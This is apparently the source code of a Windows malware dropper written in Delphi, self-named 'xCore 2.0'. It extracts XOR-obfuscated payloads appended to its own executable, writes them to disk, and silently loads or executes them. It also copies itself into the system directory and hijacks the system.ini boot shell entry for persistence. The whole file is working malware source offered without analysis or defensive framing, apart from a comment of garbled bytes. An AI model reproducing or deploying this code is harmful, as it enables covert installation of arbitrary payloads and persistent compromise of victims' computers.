   program core;

   uses
     Windows, ShellApi;

   Type
     ARGType       =       (ARG_NONE = -1,
                            ARG_UI1 = 0, ARG_I1,
                            ARG_UI2, ARG_I2,
                            ARG_UI4, ARG_I4,
                            ARG_R4, ARG_PUI1,
                            ARG_PI1, ARG_PUI2,
                            ARG_PI2, ARG_PUI4,
                            ARG_PI4, ARG_PR4);

     DLL_ARG       =       Record
           Case eType: ARGTYPE Of
             ARG_UI1       : (ucVal: PChar);
             ARG_PUI1      : (pucVal: PChar);
             ARG_I1        : (cVal: ShortInt);
             ARG_PI1       : (pcVal: ^ShortInt);
             ARG_UI2       : (usVal: Word);
             ARG_PUI2      : (pusVal: ^Word);
             ARG_I2        : (sVal: SmallInt);
             ARG_PI2       : (psVal: ^SmallInt);
             ARG_UI4       : (ulVal: Longword);
             ARG_PUI4      : (pulVal: ^Longword);
             ARG_I4        : (lVal: Integer);
             ARG_PI4       : (plVal: ^Integer);
             ARG_R4        : (fltVal: Single);
             ARG_PR4       : (pfltVal: ^Single);
           End;

   Function CallDLLByName(szLibrary, szFunction: PChar;
                          Arguments: Array of DLL_ARG; nArgCount: Integer;
                          var pRetVal: DLL_ARG): Integer; cdecl;

   Var
     pFun          :Integer;
     dwTemp        :LongWord;
     dwRet         :LongWord;
     I             :Integer;
     m_hDLL        :Integer;
   Begin
     Result := 1;
     pFun  := 0;
     dwRet := 0;
     m_hDLL := 0;
     If (m_hDLL = 0) Then
       m_hDLL := LoadLibrary(szLibrary)
     Else
       Exit;

     If (m_hDLL = 0) Then
     Begin
       Result := 1;
       Exit;
     End;

     pFun := Integer(GetProcAddress(m_hDLL, szFunction));
     If (pFun <> 0) Then
     Begin
       For I := High(Arguments) Downto Low(Arguments) Do
       Begin
         CopyMemory(@dwTemp, @Arguments[I].lVal, SizeOf(LongWord));
       ASM push dwTemp End;
     End;

     If (pRetVal.eType = ARG_R4) Then
     Begin
       ASM
       call dword ptr [pFun]
       fstp dword ptr [dwRet]
       End;
     end
     Else
     Begin
       ASM
       call dword ptr [pFun]
       mov  dword ptr [dwRet], eax
       End;
     End;

     For i := Low(Arguments) To High(Arguments) Do
     Begin
       ASM pop dwTemp End;
       Try
         CopyMemory(@Arguments[I].cVal, @dwTemp, SizeOf(LongWord));
       Except
         Result := 1;
         Exit;
       End;
     End;

     If (pRetVal.eType <> ARG_NONE) Then
     Begin
       pRetVal.eType := ARG_I4;
       pRetVal.lVal  := dwRet;
     End;
     End
     Else
     Begin
       Result := 2;
       Exit;
     End;

     Result := 0;
   End;

   Procedure EncryptData(Var Data: String);
   Var
     ASCII_Ord     :Integer;
     ASCII_Xor     :Integer;
     Int           :Integer;

     ASCII_Char    :String;
     ASCII_Result  :String;
     ASCII_Temp    :String;
   Begin
     If (Data = '') Then Exit;
     ASCII_Result := '';

     For Int := 1 To (Length(Data)) Do
     Begin
       ASCII_Temp := Data[Int];
       ASCII_Ord  := Ord(ASCII_Temp[1]);
       ASCII_Xor  := ((ASCII_Ord XOR 10) Xor 2);
       ASCII_Char := Chr(ASCII_Xor);
       ASCII_Result := ASCII_Result + ASCII_Char;
     End;

     Data := ASCII_Result;
   End;

   Procedure DoPlugin(DLL, Name: String; Args: Array Of DLL_ARG);
   Var
     GetRet        :DLL_ARG;
   Begin
     CallDLLByName(pChar(DLL), pChar(Name), Args, High(Args), GetRet);
   End;

   Procedure LoadMyDLL(DLL, Name: String);
   Var
     Args: Array[0..3] Of DLL_ARG;
   Begin
     Args[0].eType := ARG_UI4;
     DoPlugin(DLL, Name, ARGS);
   End;

   Procedure ReadFileStr(Name: String; Var Output: String);
   Var
     cFile :File Of Char;
     Buf   :Array [1..1024] Of Char;
     Len   :LongInt;
     Size  :LongInt;
   Begin
     Try
       Output := '';

       AssignFile(cFile, Name);
       Reset(cFile);
       Size := FileSize(cFile);
       While Not (Eof(cFile)) Do
       Begin
         BlockRead(cFile, Buf, 1024, Len);
         Output := Output + String(Buf);
       End;
       CloseFile(cFile);

       If Length(Output) > Size Then
         Output := Copy(Output, 1, Size);
     Except
       ;
     End;
   End;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
     0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   Function ExtractFileExt(Name: String): String;
   Var
     I     :Integer;
   Begin
     Result := '';
     For I := Length(Name) DownTo 1 Do
     Begin
       If (Name[I] = '.') Then
       Begin

         Break;
       End;
       Result := Name[I]+Result;
     End;
   End;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure ReleaseFiles;
   Var
     Content       :String;
     Settings      :String;
     FSet          :String;
     PName         :String;
     EncryptBuf    :String;

     DLL_Load      :String;
     DLL_Name      :String;
     DLL_Call      :String;

     DLL_Size      :Integer;
     I             :Integer;

     F             :FILE;

     fTemp         :THandle;
     buffer: array[0..$ffff] of byte;
     BytesRead, BytesWritten: cardinal;
   Begin
     PName := 'Temp';

     If Not (CopyFile(pChar(ParamStr(0)), pChar(PName), False)) Then Exit;
     ReadFileStr(PName, Content);

     I := Length(Content);
     Settings := '';

     While (I > 0) and (Content[i] <> #00) Do
     Begin
       Settings := Content[i] + Settings;
       Dec(I);
     End;

     If (Settings = '') Then
     Begin
       DeleteFile(pChar(PName));
       Exit;
     End;

     Delete(Content, I, Length(Settings));

     While (Pos(#01, Settings) > 0) Do
     Begin
       // How it is:        Load#04Name#03Size#02DllCall#01

       FSet := Copy(Settings, 1, Pos(#01, Settings)-1);
       Delete(Settings, 1, Pos(#01, Settings));

       DLL_Load := Copy(FSet, 1, Pos(#04, FSet)-1);
       Delete(FSet, 1, Pos(#04, FSet));

       DLL_Name := Copy(FSet, 1, Pos(#03, FSet)-1);
       Delete(FSet, 1, Pos(#03, FSet));

       DLL_Size := StrToInt(Copy(FSet, 1, Pos(#02, FSet)-1));
       Delete(FSet, 1, Pos(#02, FSet));

       DLL_Call := FSet;

       EncryptBuf := Copy(Content, Length(Content)-DLL_Size, DLL_Size);
       EncryptData(EncryptBuf);

       Try
         fTemp := FileCreate(DLL_Name);

   //      SetLength(Buffer, Length(EncryptBuf)+1);
         Move(EncryptBuf[1], Buffer, Length(EncryptBuf));

         WriteFile(fTemp, Buffer, Length(EncryptBuf), BytesWritten, NIL);

         FileClose(fTemp);

         If (UpperCase(ExtractFileExt(DLL_Name)) = 'DLL') Then
         Begin
           If (DLL_Load = '1') Then
             LoadMyDLL(DLL_Name, DLL_Call);
         End Else
         If (UpperCase(ExtractFileExt(DLL_Name)) <> 'DLL') Then
         Begin
           If (DLL_Load = '1') Then
             ShellExecute(0, 'open', pchar(DLL_Name), nil, nil, 0);
         End;
       Except
         ;
       End;
     End;
     DeleteFile(pChar(PName));
   End;

   Procedure DoInstall;
   Var
     Dir   :Array[0..255] Of Char;
     Name  :String;
   Begin

     Name := '\xCore.com';
     GetSystemDirectory(@Dir, 256);
     Name := String(Dir)+Name;

     If (ParamStr(0) <> Name) Then
     Begin
       CopyFile(pChar(ParamStr(0)), pChar(Name), False);
       WritePrivateProfileString('boot', 'shell', 'Explorer.exe xCore.com', 'system.ini');
     End;

     ReleaseFiles;
   End;

   begin
     (*
     ?????Z2¶§???????????? !"d#$%&'++---¦-+---,6-./01/23455?_?????¦§²nvn··°˜÷÷)=(=±=nef8dOtTFtµsSpGßa¯¦¦_
     ¦++++++++---++¦¦¦++¬½¼¡«»¦¦¦á¬¿ºñªÑàêúóíáƒP¥£¢ÜÖÿùûòòöôÆæÉÅÄîïèëêçåâàäéü¦¦
     *)

     If (CreateMutexA(NIL, FALSE, '--xCore--2.0--') = ERROR_ALREADY_EXISTS) Then
       ExitProcess(0);

     DoInstall;
   end.
